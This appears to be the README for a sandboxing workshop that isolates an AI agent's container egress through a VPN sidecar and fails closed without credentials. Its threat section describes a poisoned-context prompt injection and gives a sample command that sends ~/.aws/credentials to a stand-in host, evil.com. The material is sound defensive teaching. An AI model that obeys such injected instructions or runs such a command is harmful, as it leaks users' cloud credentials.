# Network egress isolation

A workshop on the *network* side of Tier 2 sandboxing: a docker-compose pattern that routes a worker container's egress through a VPN sidecar (or, with no credentials, fails closed entirely).

## What you'll learn

- The shared-namespace trick: `network_mode: "service:gluetun"` makes one container inherit another container's network. The sidecar owns connectivity; the worker owns workload.
- The fail-closed pattern: when the sidecar can't establish a tunnel (no credentials, downed provider, misconfiguration), the worker has no network at all. No silent fall-back to direct connectivity.
- Why egress control is its own dimension, separate from filesystem isolation. Cred-scrub and container-isolation address what the agent can *read*; this addresses where it can *send*.
- The OPSEC limit: a VPN hides identity, not the *fact* you're using a VPN. Mullvad-issued IPs are public knowledge.

## Threats addressed

- **S1 (credential exfiltration via poisoned context)** — closes the HTTP exfil path. A poisoned context that tells your agent to `curl evil.com | base64 < ~/.aws/credentials` either fails closed (no VPN) or routes through a known exit (with VPN), making downstream detection easier.
- Composes with **container-isolation** as the network counterpart to its filesystem isolation.

## Relationship to the other topics

This topic builds on **`container-isolation/`**. The hardening flags (`--user`, `--read-only`, `--cap-drop=ALL`) are still relevant; they just don't address network egress on their own. Together with this topic, you have both axes of Tier 2 isolation.

If you haven't done container-isolation yet, that's the prerequisite. Then come back here.

## What you need

- A shell (bash/zsh on Mac/Linux/WSL).
- **Docker** (24+) with `docker compose` v2. See `../../REQUIREMENTS.md`.
- An internet connection on first run, to pull `qmcgaw/gluetun:v3` and build the worker image.
- *Optional, for the going-further section:* a paid VPN subscription that gluetun supports (Mullvad, ProtonVPN, NordVPN, etc.). The workshop body works without one; the subscription unlocks the "actually route through the VPN" demonstration.

## Time

- Surface pass: ~20 minutes.
- Including the going-further VPN configuration: another ~30 if you have credentials handy.

## Layout

```
README.md            — this file
workshop.md          — the exercise
discussion.md        — questions to ask your LLM
PORTING.md           — handoff doc for adding Mac and Windows
linux/
  Dockerfile         — builds the worker image (curl, dig, nc baked in)
  docker-compose.yml — gluetun sidecar + worker stack
  .env.example       — copy to .env and fill in for VPN credentials
  egress-probe.sh    — DNS, HTTPS, direct-IP, exit-IP, IPv6, raw TCP, proxy
  run-baseline.sh    — egress probe in a default container (no sidecar)
  run-via-sidecar.sh — egress probe in worker, routed through gluetun
  notes.md           — Linux-specific notes
  tests/run.sh       — verifies fail-closed behavior without VPN credentials
```

WSL users follow the Linux folder. Mac and Windows aren't built yet — see `PORTING.md`.
